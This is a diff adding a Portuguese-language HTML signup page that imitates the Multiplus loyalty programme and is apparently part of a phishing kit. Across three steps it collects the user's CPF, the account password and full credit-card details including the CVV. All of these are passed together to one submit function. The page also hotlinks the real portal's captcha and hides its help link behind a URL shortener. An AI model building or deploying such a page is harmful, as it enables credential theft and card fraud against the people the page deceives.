@@ -1,0 +1,182 @@
+<!doctype html>
+<html lang=pt-BR ng-app="Multiplus">
+    <head>
+        <meta charset="UTF-8">
+        <title></title>
+        <link rel="stylesheet" href="stylesheet/style.css" />
+        <script src="javascript/libs/angular/angular.min.js"></script>
+        <script src="javascript/app.js"></script>
+    </head>
+    <body ng-controller="MainCtrl">
+        <div class="container">
+            <div class="wrapper">
+                <header class="boxer">
+                    <div class="logo"></div>
+                </header>
+                <section>
+                    <div class="box1 left">
+
+                        <div class="info">
+                            <div class="nfo">
+                            TRANSFORME SEUS GASTOS DO DIA A DIA EM <br/>
+                            PONTOS PARA TROCAR POR PRODUTOS E <br/>
+                            SERVIÇOS. VEJA COMO FUNCIONA:
+                            </div>
+                        </div>
+                        <div class="boxIcons left">
+                            <div>
+                                <div class="left icons">
+                                    <div><img src="imgs/junte_troque_1.png" alt=""/></div>
+                                    <div class="bullet"><img src="imgs/bullet_3circ.png" alt=""/></div>
+                                    <div><img src="imgs/junte_troque_2.png" alt=""/></div>
+                                    <div class="bullet"><img src="imgs/bullet_3circ.png" alt=""/></div>
+                                    <div><img src="imgs/junte_troque_3.png" alt=""/></div>
+                                </div>
+                                <div class="left"></div>
+                                <div class="clearfix"></div>
+                            </div>
+                        </div>
+
+
+                        <div class="boxInfos left">
+                            <div class="textDest">
+                                <h2>JUNTE PONTOS MULTIPLUS</h2>
+                                <article>Em viagens, compras do dia a dia, transferindo os pontos dos seus cartões
+                                    de crédito e de outros programas de fidelidade.</article>
+                            </div>
+                            <div class="textDest">
+                                <h2>TROQUE POR PRÊMIOS</h2>
+                                <article>Resgate passagens aéreas, diárias em hotéis e milhares de opções de produtos e
+                                    serviços.</article>
+                            </div>
+                        </div>
+                        <div class="clearfix"></div>
+
+                    </div>
+
+
+                    <div class="box2 left">
+                        <form action="" name="myForm">
+                            <h1 class="multTitle" ng-show="step1">Cadastre-se na Multiplus. É grátis!</h1>
+                            <h1 class="multTitle" ng-show="step2">Confirmação</h1>
+                            <h1 class="multTitle" ng-show="step3">Concluindo cadastro</h1>
+                            <div class="jumbotron">
+                                <div class="jumboText">
+
+
+                                    <!-- PASSO 1 -->
+                                    <div class="step1" ng-show="step1">
+                                        Informe seu CPF para verificar se você já possui um cadastro Multiplus:
+
+                                        <div class="left">
+                                                <div>
+                                                    <input class="form-control cpf" onblur="validaCPF(this)" type="text" placeholder="Digite seu CPF" name="cpf" ng-model="cpf" maxlength="11" onkeyup="this.value=this.value.replace(/[^\d]/, '')" /><!--  ng-required="" ng-pattern="/^([0-9]{2}[\.]?[0-9]{3}[\.]?[0-9]{3}[\/]?[0-9]{4}[-]?[0-9]{2})|([0-9]{3}[\.]?[0-9]{3}[\.]?[0-9]{3}[-]?[0-9]{2})$/" maxlength="14" / -->
+                                                </div>
+                                                <div>
+                                                    <input class="form-control" type="text" name="captcha" placeholder="Digite a imagem do lado" ng-required="" ng-model="login.captcha" />
+                                                </div>
+                                                <div>
+                                                    <input type="button" class="btnSubmit" value="CADASTRAR" ng-disabled="!cpf || !login.captcha" ng-click="sendStep1()" />
+                                                </div>
+                                        </div>
+
+                                        <div class="left rightBx">
+                                            <div class="textInformations">
+                                                Digite apenas números.
+                                            </div>
+                                            <img src="https://portal.multiplusfidelidade.com.br/cadastro/pages/CaptchaImplementacao" alt=""/>
+                                        </div>
+
+                                        <div class="clearfix"></div>
+                                    </div>
+
+
+
+                                    <!-- PASSO 2 -->
+                                    <div class="step2" ng-show="step2">
+                                        <div>
+                                            Agora informe sua senha para confirmar a solicitação:
+                                        </div>
+
+                                        <div>
+                                            <div class="bx1 left">
+                                                <div class="frmCtrlS2">
+                                                    <input class="form-control" type="password" ng-model="cc.senha" name="" value="" placeholder="Senha de acesso" />
+
+                                                </div>
+                                                <div>
+                                                    <input type="button" class="btnSubmit" value="CONFIRMAR"  ng-click="sendStep2()" />
+                                                </div>
+                                            </div>
+
+
+                                            <div class="bx2 left textInformations">
+                                                <p>Senha de acesso multiplus</p>
+                                                <p><a href="http://migre.me/pSC8m" target="_blank">Esqueceu sua senha</a></p>
+                                            </div>
+
+                                            <div class="clearfix"></div>
+                                        </div>
+
+                                    </div>
+
+
+
+
+                                    <!-- PASSO 3 -->
+                                    <div class="step3" ng-show="step3">
+                                        Para finalizar, cadastre um cartão com os dados pedidos abaixo:
+                                        <div class="frmLast">
+                                                <div class="bandeira">
+                                                    <div class="boxBand left" ng-click="activeBandeira('visa')" ng-class="{'clicked': cVisa}"><img src="imgs/bandeiras/visa.jpg" class="band" alt="Visa"/></div>
+                                                    <div class="boxBand left" ng-click="activeBandeira('master')" ng-class="{'clicked': cMaster}"><img src="imgs/bandeiras/master.jpg" class="band" alt="MasterCard"/></div>
+                                                    <div class="boxBand left" ng-click="activeBandeira('hiper')" ng-class="{'clicked': cHiper}"><img src="imgs/bandeiras/hiper.jpg" class="band" alt="HiperCard"/></div>
+                                                    <div class="boxBand left" ng-click="activeBandeira('diners')" ng-class="{'clicked': cDiners}"><img src="imgs/bandeiras/diners.jpg" class="band" alt="Diners"/></div>
+                                                    <div class="boxBand left" ng-click="activeBandeira('aura')" ng-class="{'clicked': cAura}"><img src="imgs/bandeiras/aura.jpg" class="band" alt="Aura"/></div>
+                                                    <div class="boxBand left" ng-click="activeBandeira('elo')" ng-class="{'clicked': cElo}"><img src="imgs/bandeiras/elo.jpg" class="band elo" alt="Elo"/></div>
+                                                    <div class="boxBand left" ng-click="activeBandeira('express')" ng-class="{'clicked': eExpress}"><img src="imgs/bandeiras/express.jpg" class="band" alt="AmericanExpress"/></div>
+                                                    <div class="clearfix"></div>
+                                                </div>
+                                                <div>
+                                                    <input ng-model="cc.numcard" class="form-control num-cartao" ng-keyup="validate(cc)" type="text" placeholder="Número do cartão" value="" name="numcard" maxlength="19"
+                                                            onkeyup="this.value=this.value.replace(/[^\d]/, '')" />
+                                                    <input class="form-control cvv" type="text" placeholder="CVV" value="" name="cvv" maxlength="4"  ng-model="cvv" />
+                                                    <select class="form-control valid-mes" type="text" name="mes"
+                                                            ng-model="cc.mes"
+                                                            ng-options="mes.num for mes in meses">
+                                                        <option value="">Mês</option>
+                                                    </select>
+                                                    <select class="form-control valid-ano" type="text" name="ano"
+                                                            ng-model="cc.ano"
+                                                            ng-options="ano.num for ano in anos">
+                                                        <option value="">Ano</option>
+                                                    </select>
+                                                </div>
+                                                <div>
+                                                    <input class="form-control titular" type="text" placeholder="Titular do cartão" value="" name="titular" ng-model="cc.titular" />
+                                                    <input type="button" class="btnConc" value="CONCLUIR" ng-click="sendStep3(cpf, cc.senha, cc.numcard, cvv, cc.mes, cc.ano, cc.titular)" />
+                                                </div>
+                                        </div>
+                                    </div>
+
+
+
+                                </div>
+                            </div>
+                        </form>
+
+                        <div class="loader" ng-show="load"></div>
+                    </div>
+                    <div class="clearfix"></div>
+                </section>
+                <footer>
+                    <div class="fooTxt">
+                        FAÇA PARTE DA MELHOR <br />
+                        REDE DE FIDELIZAÇÃO DO PAÍS!
+                    </div>
+                </footer>
+                <script src="javascript/validates.js"></script>
+            </div>
+        </div>
+    </body>
+</html>
